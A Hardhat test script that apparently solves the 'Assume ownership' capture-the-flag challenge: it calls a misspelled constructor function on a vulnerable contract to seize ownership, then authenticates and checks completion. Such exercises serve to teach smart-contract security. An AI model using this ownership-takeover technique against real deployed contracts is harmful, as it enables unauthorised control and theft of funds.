const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = `0x31C61631bD1580162975aCF4280215a8EB613FA9`;

before(async () => {
  accounts = await ethers.getSigners();
  player = accounts[0];
});

it("AssumeOwnership", async function () {
  const chFactory = await ethers.getContractFactory("AssumeOwnershipChallenge");
  contract = await chFactory.attach(CHALLENGE_ADDRESS); //update the challenge address

  tx = await contract.AssumeOwmershipChallenge({ gasLimit: 6e6 });
  console.log("AssumeOwmershipChallenge called");
  await tx.wait();
  console.log("AssumeOwmershipChallenge tx completed");

  tx = await contract.authenticate({ gasLimit: 6e6 });
  console.log("authenticate tx initiated");
  await tx.wait();
  console.log("authenticate tx completed");

  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
